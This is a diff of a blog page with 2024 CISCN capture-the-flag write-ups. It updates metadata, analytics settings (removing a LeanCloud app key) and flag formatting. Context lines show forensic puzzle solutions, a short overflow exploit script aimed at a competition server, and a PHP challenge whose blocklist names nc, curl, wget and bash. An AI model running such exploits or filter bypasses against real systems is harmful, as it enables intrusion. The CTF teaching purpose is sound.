@@ -21,7 +21,7 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="dr0n">
-  <meta name="keywords" content="">
+  <meta name="keywords" content="ctf, writeups, web, misc">
   
     <meta name="description" content="miscPower Trajectory Diagram先将npz解压，然后将功耗转成图片分析 12345678910from PIL import Imageimport numpy as npind&#x3D;np.load(&quot;index.npy&quot;)p&#x3D;np.load(&quot;trace.npy&quot;)for j,a in enumerate(p):    img&#x3D;Imag">
 <meta property="og:type" content="article">
@@ -57,9 +57,9 @@
 <meta property="article:published_time" content="2024-05-20T04:30:00.000Z">
 <meta property="article:modified_time" content="2025-12-28T10:40:28.231Z">
 <meta property="article:author" content="dr0n">
-<meta property="article:tag" content="wp">
 <meta property="article:tag" content="2024竞赛">
 <meta property="article:tag" content="ciscn">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://www.dr0n.top/img/wp/2024/2024ciscn-%E7%81%AB%E9%94%85%E9%93%BE%E8%A7%82%E5%85%89%E6%89%93%E5%8D%A1-1.png">
   
@@ -103,7 +103,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9,"expand_all":true},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"openkounter":{"server_url":"https://openkounter-1lbvmren.edgeone.cool/","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -137,13 +137,11 @@
   
 
   
-    
-  
 
 
 
   
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -322,20 +320,13 @@
         
         
         
-          42 分钟
+          46 分钟
         
       </span>
     
 
     
     
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
       
     
   </div>
@@ -403,11 +394,11 @@
 <p>在<code>ppt\media\image57.jpg</code>底部存在密文，base64解密得到<code>parT9:dee</code></p>
 <p><img src="/img/wp/2024/2024ciscn-%E7%A5%9E%E7%A7%98%E6%96%87%E4%BB%B6-3.png" srcset="/img/loading.gif" lazyload></p>
 <p>在<code>ppt\comments\comment1.xml</code>中得到第十部分</p>
-<p>维吉尼亚后base64 <code>PARt10:9&#125;</code></p>
+<p>维吉尼亚后base64 <code>PARt10:9}</code></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>ZYWJbIYnFhq9<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>What is this？<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Vigenere cipher is good！<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Aha，the key is<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>Is what？<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>furry<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p:text</span>&gt;</span>🆗<span class="hljs-tag">&lt;/<span class="hljs-name">p:text</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 <p>在<code>docProps\app.xml</code>得到加密方式，<code>docProps\core.xml</code>得到密文和密钥</p>
-<p>Bifid解密后base64 <code>Part1:flag&#123;e</code></p>
+<p>Bifid解密后base64 <code>Part1:flag{e</code></p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span>&gt;</span>Bifid cipher<span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dc:title</span>&gt;</span>这是一个标题 QFCfpPQ6ZymuM3gq<span class="hljs-tag">&lt;/<span class="hljs-name">dc:title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dc:creator</span>&gt;</span>Administrator;Key:lanjing<span class="hljs-tag">&lt;/<span class="hljs-name">dc:creator</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 
@@ -422,7 +413,7 @@
 <figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs vb"><span class="hljs-keyword">Sub</span> crypto(sMessage, strKey)<br>    <span class="hljs-keyword">Dim</span> kLen, x, y, i, j, temp<br>    <span class="hljs-keyword">Dim</span> s(<span class="hljs-number">256</span>), k(<span class="hljs-number">256</span>)<br><br>    kLen = Len(strKey)<br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">255</span><br>        s(i) = i<br>        k(i) = Asc(<span class="hljs-keyword">Mid</span>(strKey, (i <span class="hljs-built_in">Mod</span> kLen) + <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">Next</span><br><br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">0</span> <span class="hljs-keyword">To</span> <span class="hljs-number">255</span><br>        j = (j + k(i) + s(i)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(i)<br>        s(i) = s(j)<br>        s(j) = temp<br>    <span class="hljs-keyword">Next</span><br><br>    x = <span class="hljs-number">0</span><br>    y = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> <span class="hljs-number">3072</span><br>        x = (x + <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        y = (y + s(x)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br>    <span class="hljs-keyword">Next</span><br><br>    <span class="hljs-keyword">For</span> i = <span class="hljs-number">1</span> <span class="hljs-keyword">To</span> Len(sMessage)<br>        x = (x + <span class="hljs-number">1</span>) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        y = (y + s(x)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span><br>        temp = s(x)<br>        s(x) = s(y)<br>        s(y) = temp<br><br>        crypto = crypto &amp; (s((s(x) + s(y)) <span class="hljs-built_in">Mod</span> <span class="hljs-number">256</span>) <span class="hljs-built_in">Xor</span> Asc(<span class="hljs-keyword">Mid</span>(sMessage, i, <span class="hljs-number">1</span>))) &amp; <span class="hljs-string">&quot;,&quot;</span><br>    <span class="hljs-keyword">Next</span><br>    <span class="hljs-comment">&#x27;i13POMdzEAzHfy4dGS+vUA==(After base64)</span><br><span class="hljs-keyword">End</span> <span class="hljs-keyword">Sub</span><br></code></pre></td></tr></table></figure>
 
 <p>rc4后base64得到<code>PArt3:3-34</code></p>
-<p>将一到十部分拼接在一起：<code>flag&#123;e675efb3-346f-405f-90dd-222b387edee9&#125;</code></p>
+<p>将一到十部分拼接在一起：<code>flag{e675efb3-346f-405f-90dd-222b387edee9}</code></p>
 <h2 id="通风机"><a href="#通风机" class="headerlink" title="通风机"></a>通风机</h2><p>修补文件头，加上<code>GJK</code>后用<code>STEP 7 Micro/WIN</code>打开</p>
 <p>符号表里注释的字符串base64得到flag</p>
 <p><img src="/img/wp/2024/2024ciscn-%E9%80%9A%E9%A3%8E%E6%9C%BA-1.png" srcset="/img/loading.gif" lazyload></p>
@@ -444,7 +435,7 @@
 <p><img src="/img/wp/2024/2024ciscn-%E7%9B%97%E7%89%88%E8%BD%AF%E4%BB%B6-2.png" srcset="/img/loading.gif" lazyload></p>
 <p>拼接后md5</p>
 <p><code>winhack.com39.100.72.235</code></p>
-<p><code>flag&#123;096e8b0f9daf10869f013c1b7efda3fd&#125;</code></p>
+<p><code>flag{096e8b0f9daf10869f013c1b7efda3fd}</code></p>
 <h2 id="p-p"><a href="#p-p" class="headerlink" title="p&amp;p"></a>p&amp;p</h2><p>利用溢出修改flag写入文件位置，然后访问&#x2F;static&#x2F;1即可获得flag</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib.parse <span class="hljs-keyword">as</span> parse<br><br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/upload?name=&quot;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">112</span>+<span class="hljs-number">16</span>+<span class="hljs-number">6</span>)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1e</span>+<span class="hljs-string">&#x27;static/1&#x27;</span><br><span class="hljs-built_in">print</span>(url)<br>r=requests.get(url)<br>url=<span class="hljs-string">&quot;http://8.147.131.163:39352/test&quot;</span><br>r=requests.get(url)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>
 
@@ -472,7 +463,7 @@
 <p>然后解密提取出来的文件，密码在题目描述中</p>
 <p>根据ascii码范围，前面应该是2-7，调整位置<code>65 61 62 39 66 35 61 65 2d 30 62 39 65</code>，得到<code>eab9f5ae-0b9e</code></p>
 <p><img src="/img/wp/2024/2024ciscn-Tough_DNS-5.png" srcset="/img/loading.gif" lazyload></p>
-<p>得到<code>flag&#123;79830a47-faf7-4067-b585-145776f833cd&#125;</code></p>
+<p>得到<code>flag{79830a47-faf7-4067-b585-145776f833cd}</code></p>
 <p><img src="/img/wp/2024/2024ciscn-Tough_DNS-6.png" srcset="/img/loading.gif" lazyload></p>
 <h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Simple-php"><a href="#Simple-php" class="headerlink" title="Simple_php"></a>Simple_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br>&#125;<br><br><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
 
@@ -827,23 +818,6 @@
   
 
   
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
 
 </div>
 
@@ -1011,8 +985,6 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
